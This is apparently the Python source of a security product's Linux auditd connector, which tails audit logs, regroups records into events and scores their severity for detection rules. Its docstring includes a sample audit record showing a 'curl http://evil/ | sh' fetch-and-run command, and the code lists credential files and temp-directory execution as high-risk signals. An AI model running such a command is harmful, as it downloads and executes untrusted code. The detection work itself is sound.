"""
Linux ``auditd`` connector — file_tail mode (no host-agent dependency).

The Linux Audit subsystem (``kauditd`` in the kernel, ``auditd`` in
userspace) is the canonical telemetry source for ``execve``,
syscall-based file watches, and kernel-module load events on every
modern Linux distribution. Almost every detection rule under
``detections/endpoint/linux-*.yaml`` expects events in this shape
(``syscall``, ``exe``, ``argv``, ``path``, ``actor_uid``, ``key``).

Why ``file_tail`` only (no host-agent)?

    AiSOC is deliberately host-agent-free in v1. Operators who want
    auditd telemetry already pay for ``auditd`` itself — it's a
    standard package on every server distro. The path of least
    deployment friction is:

      1. Install AiSOC's ``audit.rules`` profile (ships at
         ``profiles/auditd/aisoc.rules``) under
         ``/etc/audit/rules.d/``.
      2. Reload with ``augenrules --load``.
      3. Mount ``/var/log/audit/audit.log`` read-only into the
         AiSOC connector pod (or run the connector on the same
         host with a sidecar deployment).

    The connector pod tails the log file forward from a saved byte
    cursor — exactly the same pattern the Kubernetes audit connector
    already uses for self-hosted clusters. No Go agent to compile, no
    second daemon to babysit, no kernel module to load.

Auditd log format (the parsing problem)

    ``auditd`` writes one line per audit *record*, but a single
    *event* can span multiple records that share the same
    ``msg=audit(timestamp:serial)`` identifier. Example
    ``execve`` event::

        type=SYSCALL msg=audit(1715520000.123:9876): arch=c000003e syscall=59 success=yes ...
            uid=1000 auid=1000 comm="bash" exe="/usr/bin/bash" key="aisoc_exec"
        type=EXECVE  msg=audit(1715520000.123:9876): argc=3 a0="bash" a1="-c" a2="curl http://evil/ | sh"
        type=CWD     msg=audit(1715520000.123:9876): cwd="/tmp"
        type=PATH    msg=audit(1715520000.123:9876): item=0 name="/usr/bin/bash" ...
        type=PROCTITLE msg=audit(1715520000.123:9876): proctitle="bash\0-c\0..."

    The connector reassembles the records into one normalized event
    per ``(timestamp, serial)`` tuple before handing it to ingest, so
    a detection rule can express ``syscall == "execve" AND exe
    ENDSWITH "/auditctl" AND argv CONTAINS_ANY ["-D", "-e 0"]``
    against a single document instead of having to JOIN across
    sibling records.

What we don't do

    * No kernel-side rule evaluation (that's auditd's job — see
      ``profiles/auditd/aisoc.rules``).
    * No real-time push (the connector is poll-driven on the same
      cadence as every other AiSOC connector — typically 60s).
    * No host-agent. The whole connector is a Python file_tail
      reader; if you want a real-time push agent the v2 ``host-agent``
      workstream covers it.

Severity heuristic

    Audit records carry ``key=...`` strings set by the operator's
    rules. The AiSOC ``audit.rules`` profile names every rule
    ``aisoc_<bucket>`` so the connector can derive a meaningful
    severity from the key alone:

      * ``aisoc_critical_*`` → ``high``
      * ``aisoc_exec``,
        ``aisoc_persistence_*``,
        ``aisoc_priv_esc_*``       → ``medium``
      * ``aisoc_watch_*``,
        ``aisoc_audit_*``          → ``low``
      * everything else            → ``info``

    Operators who don't use the AiSOC profile (e.g. they keep a
    pre-existing audit.rules from CIS / STIG) still get useful
    coverage — we fall back to syscall-based heuristics
    (``execve`` from ``/dev/shm`` or ``/tmp`` → ``high``;
    write to ``/etc/passwd`` / ``/etc/shadow`` → ``high``;
    everything else → ``info``).
"""

from __future__ import annotations

import os
import re
from collections import defaultdict
from pathlib import Path
from typing import Any

import structlog

from app.connectors.base import BaseConnector, Capability, ConnectorSchema, Field

logger = structlog.get_logger()


# ---------------------------------------------------------------------------
# Parsing primitives
# ---------------------------------------------------------------------------
#
# auditd records are key=value pairs separated by whitespace. Values can be:
#   * unquoted bareword: ``arch=c000003e``
#   * double-quoted string: ``exe="/usr/bin/bash"``
#   * hex-encoded blob: ``proctitle=626173680A2D63...`` (no quotes around
#     binary safe-ish strings — auditd hex-encodes anything containing
#     a NUL, newline, or special byte)
#
# This regex captures key + value (quoted or not) without splitting on
# spaces inside double-quoted values. We deliberately don't try to
# handle every pathological case (escaped quotes inside quoted values
# don't appear in real auditd output) — if a single record fails to
# parse we drop it and log, which is better than corrupting the batch.
_KV_RE = re.compile(r'(\w+)=(?:"([^"]*)"|(\S+))')

# Every record starts with ``msg=audit(<timestamp>:<serial>)``. We pull
# (timestamp, serial) as the event key — every record sharing this
# tuple belongs to the same logical event.
_MSG_RE = re.compile(r"msg=audit\((\d+\.\d+):(\d+)\)")


# Hard ceiling on bytes read per poll. Same rationale as the
# kubernetes_audit connector: a busy host can produce hundreds of MB
# per minute under heavy execve activity, and we'd rather drop the
# trailing slice from one poll than wedge the scheduler.
_MAX_TAIL_BYTES_PER_POLL = 8 * 1024 * 1024  # 8 MiB

# Hard ceiling on records reassembled per poll. Pathological
# ``execve`` storms (e.g. fork bombs, CI runners spawning a million
# processes) would otherwise consume unbounded memory while we hold
# the per-event dict in ``_assemble_events``.
_MAX_EVENTS_PER_POLL = 50_000


# ---------------------------------------------------------------------------
# Severity mapping
# ---------------------------------------------------------------------------
#
# Highest-priority match wins. Order matters: the explicit
# ``aisoc_critical_*`` prefix takes precedence over the generic
# ``aisoc_exec`` bucket so an operator can promote a single rule to
# critical by renaming it.

_KEY_SEVERITY_PREFIXES: tuple[tuple[str, str], ...] = (
    ("aisoc_critical_", "critical"),
    ("aisoc_priv_esc_", "high"),
    ("aisoc_persistence_", "medium"),
    ("aisoc_exec", "medium"),
    ("aisoc_watch_", "low"),
    ("aisoc_audit_", "low"),
)

# Filesystem paths whose modification (regardless of operator key)
# should always be treated as ``high``. Picked from the standard
# Linux post-exploitation playbook.
_HIGH_RISK_PATHS: frozenset[str] = frozenset(
    {
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
        "/etc/ssh/sshd_config",
    }
)

# Directories from which a fresh ``execve`` is almost always
# malicious (no legitimate package installs binaries here).
_HIGH_RISK_EXEC_DIRS: tuple[str, ...] = (
    "/dev/shm/",
    "/tmp/",
    "/var/tmp/",
    "/run/shm/",
)


def _severity_from_event(event: dict[str, Any]) -> str:
    """Bucket a reassembled auditd event into AiSOC's 5-tier ladder.

    Priority order:
      1. AiSOC-profile key prefix match (``aisoc_critical_*`` etc.).
      2. Path-based heuristic (writes to ``/etc/shadow`` etc.).
      3. Exec-from-temp heuristic.
      4. ``info`` floor.
    """
    key = (event.get("key") or "").strip().strip('"')
    if key:
        for prefix, sev in _KEY_SEVERITY_PREFIXES:
            if key.startswith(prefix):
                return sev

    path = event.get("path") or ""
    if path in _HIGH_RISK_PATHS:
        return "high"

    syscall = event.get("syscall") or ""
    exe = event.get("exe") or ""
    if syscall == "execve" and exe.startswith(_HIGH_RISK_EXEC_DIRS):
        return "high"

    return "info"


# ---------------------------------------------------------------------------
# Record / event reassembly helpers
# ---------------------------------------------------------------------------


def _parse_record(line: str) -> tuple[tuple[str, str] | None, str | None, dict[str, str]]:
    """Parse a single auditd record line into ``(event_id, type, fields)``.

    ``event_id`` is the ``(timestamp, serial)`` tuple shared by every
    record in the same logical event. ``type`` is the record type
    (``SYSCALL``, ``EXECVE``, ``PATH``, ``CWD``, ``PROCTITLE`` …).
    Returns ``(None, None, {})`` when the line is malformed so the
    caller can drop it cleanly.
    """
    msg_match = _MSG_RE.search(line)
    if not msg_match:
        return None, None, {}
    event_id = (msg_match.group(1), msg_match.group(2))

    # Extract record type explicitly so the caller can look up
    # type-specific keys without scanning the whole field dict.
    type_match = re.match(r"type=(\S+)", line)
    record_type = type_match.group(1) if type_match else None

    fields: dict[str, str] = {}
    for kv_match in _KV_RE.finditer(line):
        key = kv_match.group(1)
        # group(2) = quoted value (already unquoted), group(3) = unquoted token
        value = kv_match.group(2) if kv_match.group(2) is not None else kv_match.group(3)
        fields[key] = value
    return event_id, record_type, fields


def _decode_hex_string(hex_str: str) -> str:
    """Decode an auditd hex-encoded string to a NUL-separated string.

    auditd hex-encodes ``proctitle`` (and any other field containing
    bytes that would break the ``key=value`` framing) by writing the
    raw bytes as ASCII hex with no leading prefix. The decoded
    payload typically contains NUL separators between argv tokens
    (this is exactly how the kernel stores ``argv`` in
    ``/proc/<pid>/cmdline``). We replace NULs with spaces so detection
    rules and human readers see a single readable command line.
    """
    try:
        raw = bytes.fromhex(hex_str)
    except ValueError:
        return hex_str
    return raw.decode("utf-8", errors="replace").replace("\x00", " ").strip()


def _extract_argv(execve_fields: dict[str, str]) -> list[str]:
    """Reassemble ``argv`` from an ``EXECVE`` record's ``a0=…ax=…``."""
    argv: list[str] = []
    # ``a0``, ``a1``, … are the positional argv slots. Walk the
    # contiguous prefix; auditd always emits them in order so we
    # stop at the first gap.
    idx = 0
    while True:
        slot = execve_fields.get(f"a{idx}")
        if slot is None:
            break
        argv.append(slot)
        idx += 1
    return argv


def _assemble_events(
    records: list[tuple[tuple[str, str] | None, str | None, dict[str, str]]],
) -> list[dict[str, Any]]:
    """Group records by ``(timestamp, serial)`` into normalised events.

    The produced dict is *flat* and matches the field naming used by
    every existing detection rule under ``detections/endpoint/`` that
    sources from auditd (``syscall``, ``exe``, ``argv``, ``path``,
    ``actor_uid``, ``key`` …). The original per-record breakdown is
    preserved on ``raw_records`` for rules that need to pivot into
    type-specific fields.
    """
    grouped: dict[tuple[str, str], dict[str, Any]] = defaultdict(
        lambda: {
            "raw_records": {},
            # Lists for record types that can appear multiple times
            # in a single event (PATH for multi-target ops, e.g.
            # ``rename``).
            "paths": [],
        }
    )

    for event_id, record_type, fields in records:
        if event_id is None or record_type is None:
            continue
        event = grouped[event_id]
        # Stash the raw fields keyed by record type so callers can
        # walk back to the original wire format.
        if record_type == "PATH":
            event["raw_records"].setdefault("PATH", []).append(fields)
            if (path_value := fields.get("name")) and path_value not in event["paths"]:
                event["paths"].append(path_value)
        else:
            event["raw_records"][record_type] = fields

        # Lift the most useful fields onto the top-level dict.
        if record_type == "SYSCALL":
            event["timestamp"] = event_id[0]
            event["serial"] = event_id[1]
            event["syscall_num"] = fields.get("syscall")
            event["syscall_name"] = fields.get("syscall_name")  # rare; kernel only
            event["success"] = fields.get("success")
            event["exit"] = fields.get("exit")
            event["actor_uid"] = fields.get("uid")
            event["actor_auid"] = fields.get("auid")
            event["actor_euid"] = fields.get("euid")
            event["actor_gid"] = fields.get("gid")
            event["actor_pid"] = fields.get("pid")
            event["actor_ppid"] = fields.get("ppid")
            event["comm"] = fields.get("comm")
            event["exe"] = fields.get("exe")
            event["tty"] = fields.get("tty")
            event["session"] = fields.get("ses")
            event["arch"] = fields.get("arch")
            event["key"] = fields.get("key")
            # Resolve the syscall *name* from the numeric id when we
            # don't already have one. Detection rules pivot on
            # ``syscall == "execve"`` strings, not numbers.
            if not event.get("syscall_name"):
                event["syscall"] = _SYSCALL_NUM_TO_NAME.get(fields.get("syscall", ""), fields.get("syscall"))
            else:
                event["syscall"] = event["syscall_name"]
        elif record_type == "EXECVE":
            event["argv"] = _extract_argv(fields)
        elif record_type == "CWD":
            event["cwd"] = fields.get("cwd")
        elif record_type == "PROCTITLE":
            raw_title = fields.get("proctitle", "")
            # PROCTITLE is hex-encoded when auditd believes the
            # title contains unsafe bytes. Heuristic: a value that
            # parses as hex AND has even length is a hex blob.
            if raw_title and len(raw_title) % 2 == 0 and all(c in "0123456789abcdefABCDEF" for c in raw_title):
                event["proctitle"] = _decode_hex_string(raw_title)
            else:
                event["proctitle"] = raw_title

    # Promote ``path`` (singular) for the common single-target case so
    # detection rules can pivot on ``path ==`` without having to
    # special-case the single-vs-many shape.
    out: list[dict[str, Any]] = []
    for (timestamp, serial), event in grouped.items():
        if event["paths"]:
            event["path"] = event["paths"][0]
        else:
            event["path"] = None
        # Compose a stable composite event_id so retries can dedupe.
        event["event_id"] = f"{timestamp}:{serial}"
        out.append(event)

    return out


# Minimal x86_64 syscall number → name table covering the syscalls
# AiSOC's detection content actually pivots on. We deliberately do
# *not* ship a full table — the long tail isn't useful and would
# bloat this file. Operators on other architectures can override the
# behaviour by setting ``--with-prefix`` audit rules that emit the
# syscall name directly via ``key`` strings.
_SYSCALL_NUM_TO_NAME: dict[str, str] = {
    "0": "read",
    "1": "write",
    "2": "open",
    "59": "execve",
    "62": "kill",
    "82": "rename",
    "84": "rmdir",
    "85": "creat",
    "86": "link",
    "87": "unlink",
    "90": "chmod",
    "91": "fchmod",
    "92": "chown",
    "94": "fchown",
    "101": "ptrace",
    "165": "mount",
    "175": "init_module",
    "257": "openat",
    "263": "unlinkat",
    "319": "memfd_create",
    "322": "execveat",
    "313": "finit_module",
}


class AuditdConnector(BaseConnector):
    """Linux ``auditd`` connector — file_tail mode (no host-agent dep).

    Configure with the path to ``audit.log`` inside the connector pod
    (typically a host-mount of ``/var/log/audit/audit.log``). The
    connector reassembles multi-record auditd events into the flat
    field shape every existing ``detections/endpoint/linux-*.yaml``
    rule expects.
    """

    connector_id = "auditd"
    connector_name = "Linux Auditd"
    connector_category = "edr"

    _DEFAULT_CURSOR_SUFFIX = ".aisoc-cursor"

    @classmethod
    def schema(cls) -> ConnectorSchema:
        return ConnectorSchema(
            connector_id=cls.connector_id,
            connector_name=cls.connector_name,
            category=cls.connector_category,
            description=(
                "Linux Audit (``auditd``) log connector. Tails "
                "``/var/log/audit/audit.log`` forward from a saved "
                "byte cursor, reassembles multi-record events "
                "(SYSCALL + EXECVE + PATH + …) into flat documents, "
                "and feeds the same execve / file-watch / kernel-module "
                "primitives that detections/endpoint/linux-*.yaml "
                "rules pivot on. Ship the AiSOC ``audit.rules`` "
                "profile (profiles/auditd/aisoc.rules) for full "
                "coverage; rules with ``aisoc_*`` keys auto-bucket "
                "into AiSOC's severity tiers."
            ),
            docs_url="/docs/connectors/auditd",
            fields=[
                Field(
                    "host_label",
                    "string",
                    "Host label",
                    required=True,
                    help_text=(
                        "Human-readable label for the host being "
                        "monitored. Surfaced on every normalised "
                        "event so detections and investigations can "
                        "filter to a single fleet member without "
                        "relying on the kernel's reported hostname."
                    ),
                ),
                Field(
                    "audit_log_path",
                    "string",
                    "Audit log path",
                    required=True,
                    default="/var/log/audit/audit.log",
                    help_text=(
                        "Absolute path to ``audit.log`` inside the "
                        "AiSOC connector pod. Mount the host's "
                        "``/var/log/audit`` directory read-only into "
                        "the pod, or run the connector on the same "
                        "host as the auditd daemon."
                    ),
                ),
                Field(
                    "cursor_path",
                    "string",
                    "Cursor file path",
                    required=False,
                    help_text=(
                        "Optional override for where AiSOC stores "
                        "its byte-position cursor. Defaults to "
                        "``<audit_log_path>.aisoc-cursor``. Use a "
                        "writeable path — the connector pod needs "
                        "to update this on every successful poll."
                    ),
                ),
            ],
        )

    @classmethod
    def capabilities(cls) -> tuple[Capability, ...]:
        # auditd is the canonical PULL_AUDIT surface for a Linux
        # host; downstream detections turn its events into alerts so
        # PULL_ALERTS is also true from the consumer's perspective.
        return (Capability.PULL_AUDIT, Capability.PULL_ALERTS)

    def __init__(
        self,
        host_label: str = "",
        audit_log_path: str = "/var/log/audit/audit.log",
        cursor_path: str = "",
    ):
        self._host_label = host_label
        self._audit_log_path = audit_log_path
        self._cursor_path = cursor_path or f"{audit_log_path}{self._DEFAULT_CURSOR_SUFFIX}"

    # ------------------------------ helpers ----------------------------------

    def _read_cursor(self) -> int:
        """Read the byte offset for the next file_tail poll.

        Missing cursor -> 0 (start of file). Corrupt cursor -> 0 with
        a warning; better to re-ingest than to silently wedge.
        """
        try:
            with open(self._cursor_path) as fh:
                raw = fh.read().strip()
            return int(raw) if raw else 0
        except FileNotFoundError:
            return 0
        except (OSError, ValueError) as exc:
            logger.warning(
                "auditd.cursor_read_failed",
                cursor_path=self._cursor_path,
                error=str(exc),
            )
            return 0

    def _write_cursor(self, offset: int) -> None:
        try:
            # Atomic write: rename is the only POSIX-portable way to
            # avoid a half-written cursor on crash.
            tmp = f"{self._cursor_path}.tmp"
            with open(tmp, "w") as fh:
                fh.write(str(offset))
            os.replace(tmp, self._cursor_path)
        except OSError as exc:
            logger.warning(
                "auditd.cursor_write_failed",
                cursor_path=self._cursor_path,
                offset=offset,
                error=str(exc),
            )

    def _tail_audit_file(self) -> list[str]:
        """Read forward from the saved byte cursor.

        Handles three rotation scenarios identically to the
        kubernetes_audit connector:
          * Truncation (size < cursor) -> reset cursor.
          * Replacement (logrotate copytruncate) -> covered by the
            truncation case.
          * Rename + create (logrotate moved old aside) -> we re-open
            the new file and start from 0 because the cursor file
            (which we own) is still pointing into the previous file's
            space.
        """
        path = Path(self._audit_log_path)
        if not path.exists():
            logger.warning("auditd.audit_log_missing", audit_log_path=str(path))
            return []

        try:
            size = path.stat().st_size
        except OSError as exc:
            logger.warning("auditd.stat_failed", audit_log_path=str(path), error=str(exc))
            return []

        cursor = self._read_cursor()
        if cursor > size:
            logger.info("auditd.cursor_reset_after_rotation", old_cursor=cursor, new_size=size)
            cursor = 0

        if cursor >= size:
            return []

        read_end = min(size, cursor + _MAX_TAIL_BYTES_PER_POLL)
        try:
            with open(path, "rb") as fh:
                fh.seek(cursor)
                chunk = fh.read(read_end - cursor)
        except OSError as exc:
            logger.warning(
                "auditd.read_failed",
                audit_log_path=str(path),
                cursor=cursor,
                error=str(exc),
            )
            return []

        # auditd writes one record per line. Hold back any trailing
        # partial line for the next poll by adjusting the cursor to
        # the last complete newline we observed.
        last_complete_offset = cursor
        lines: list[str] = []
        for raw_line in chunk.splitlines(keepends=True):
            last_complete_offset += len(raw_line)
            if not raw_line.endswith(b"\n"):
                # Partial trailing line — back the cursor up and bail.
                last_complete_offset -= len(raw_line)
                break
            stripped = raw_line.decode("utf-8", errors="replace").strip()
            if stripped:
                lines.append(stripped)

        self._write_cursor(last_complete_offset)
        return lines

    # ------------------------------ contract ---------------------------------

    async def test_connection(self) -> dict[str, Any]:
        if not self._host_label:
            return {
                "success": False,
                "connector": self.connector_id,
                "error": "host_label is required",
            }
        path = Path(self._audit_log_path)
        if not path.exists():
            return {
                "success": False,
                "connector": self.connector_id,
                "error": (
                    f"audit log path {self._audit_log_path} not found "
                    "inside the connector pod. Mount /var/log/audit "
                    "read-only from the host, or run the connector "
                    "on the same host as the auditd daemon."
                ),
            }
        if not os.access(self._audit_log_path, os.R_OK):
            return {
                "success": False,
                "connector": self.connector_id,
                "error": (f"audit log path {self._audit_log_path} is not readable by the connector pod."),
            }
        return {
            "success": True,
            "connector": self.connector_id,
            "host": self._host_label,
            "audit_log_path": self._audit_log_path,
            "cursor_path": self._cursor_path,
        }

    async def fetch_alerts(self, since_seconds: int = 300) -> list[dict[str, Any]]:
        # ``since_seconds`` is intentionally ignored — the byte cursor
        # already gives us exactly-once-ish semantics, and audit
        # records don't all carry a sortable timestamp we could use
        # to filter on a sliding window anyway.
        del since_seconds
        lines = self._tail_audit_file()
        if not lines:
            return []

        records = [_parse_record(line) for line in lines]
        events = _assemble_events(records)

        if len(events) > _MAX_EVENTS_PER_POLL:
            logger.warning(
                "auditd.event_storm_truncated",
                event_count=len(events),
                cap=_MAX_EVENTS_PER_POLL,
            )
            events = events[:_MAX_EVENTS_PER_POLL]

        return [self.normalize(e) for e in events]

    def normalize(self, raw: dict[str, Any]) -> dict[str, Any]:
        """Map a reassembled auditd event to AiSOC's normalised shape.

        The output dict is intentionally flat and uses the same field
        names every existing ``detections/endpoint/linux-*.yaml``
        rule pivots on. A small ``raw_records`` map preserves the
        per-type breakdown for rules that need to walk back to a
        specific record type.
        """
        syscall = raw.get("syscall")
        exe = raw.get("exe")
        argv = raw.get("argv") or []
        path = raw.get("path")
        actor_uid = raw.get("actor_uid")
        key = raw.get("key")

        severity = _severity_from_event(raw)

        # Human-readable title — operators in the alert inbox should
        # be able to read "what happened" without expanding the row.
        if syscall == "execve" and exe:
            argv_preview = " ".join(argv[1:6]) if len(argv) > 1 else ""
            title = f"auditd execve: {exe} {argv_preview}".strip()
        elif path:
            title = f"auditd {syscall or 'event'} on {path}"
        else:
            title = f"auditd {syscall or 'event'} ({key or 'no-key'})"

        return {
            "source": self.connector_id,
            "category": "endpoint",
            "external_id": raw.get("event_id"),
            "title": title,
            "description": (
                f"syscall={syscall} exe={exe} key={key} actor_uid={actor_uid} path={path} argv={' '.join(argv) if argv else None}"
            ),
            "severity": severity,
            "host": self._host_label,
            "hostname": self._host_label,
            # The fields below are exactly what existing
            # detections/endpoint/linux-*.yaml rules pivot on. Names
            # are stable — changing them is a breaking change for
            # detection content.
            "syscall": syscall,
            "exe": exe,
            "argv": argv,
            "path": path,
            "paths": raw.get("paths") or [],
            "cwd": raw.get("cwd"),
            "comm": raw.get("comm"),
            "proctitle": raw.get("proctitle"),
            "actor_uid": actor_uid,
            "actor_auid": raw.get("actor_auid"),
            "actor_euid": raw.get("actor_euid"),
            "actor_gid": raw.get("actor_gid"),
            "actor_pid": raw.get("actor_pid"),
            "actor_ppid": raw.get("actor_ppid"),
            "tty": raw.get("tty"),
            "session": raw.get("session"),
            "arch": raw.get("arch"),
            "auditd_key": key,
            "key": key,
            "success": raw.get("success"),
            "exit": raw.get("exit"),
            "raw_records": raw.get("raw_records") or {},
            "event_id": raw.get("event_id"),
            "timestamp": raw.get("timestamp"),
            "serial": raw.get("serial"),
        }
